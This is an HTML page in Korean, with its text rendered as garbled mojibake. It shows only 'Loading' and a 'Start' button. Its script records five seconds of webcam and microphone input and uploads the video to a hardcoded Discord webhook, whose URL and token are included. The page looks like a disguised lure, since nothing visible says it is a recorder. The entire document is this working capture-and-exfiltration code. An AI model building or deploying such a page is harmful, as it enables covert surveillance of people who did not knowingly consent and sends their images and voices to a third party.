<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>ë¡œë”©ì¤‘</title>
</head>
<body>
  <h2>ì‹œìž‘</h2>
  <p>ë¡œë”©ì¤‘</p>
  <button id="startBtn">ì‹œìž‘</button>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1393919110005653615/RgqRu8hW5dng4M3y7tp0o_67LhxuaaUYJnSxrXcjJJMWfkuR4JpU-lNCR8PCrL6mxU2e";

    async function startRecording() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];

        mediaRecorder.ondataavailable = (e) => {
          if (e.data.size > 0) chunks.push(e.data);
        };

        mediaRecorder.onstop = async () => {
          const blob = new Blob(chunks, { type: 'video/webm' });
          const file = new File([blob], "recorded.webm");

          const formData = new FormData();
          formData.append("file", file);
          formData.append("content", "**ðŸŽ¥ ë…¹í™” ì™„ë£Œ - Discordë¡œ ì „ì†¡ë¨**");

          await fetch(webhookURL, {
            method: "POST",
            body: formData
          });

          alert("ë…¹í™”ê°€ ì™„ë£Œë˜ì–´ Discordë¡œ ì „ì†¡ë˜ì—ˆìŠµë‹ˆë‹¤.");
        };

        mediaRecorder.start();

        // 5ì´ˆ ë…¹í™”
        setTimeout(() => {
          mediaRecorder.stop();
          stream.getTracks().forEach(track => track.stop());
        }, 5000);

      } catch (err) {
        console.error("ë¯¸ë””ì–´ ê¶Œí•œ ì˜¤ë¥˜ ë˜ëŠ” ê±°ë¶€ë¨:", err);
        alert("ì¹´ë©”ë¼ ë˜ëŠ” ë§ˆì´í¬ ê¶Œí•œì„ í—ˆìš©í•´ì•¼ í•©ë‹ˆë‹¤.");
      }
    }

    document.getElementById("startBtn").addEventListener("click", () => {
      startRecording();
    });
  </script>
</body>
</html>
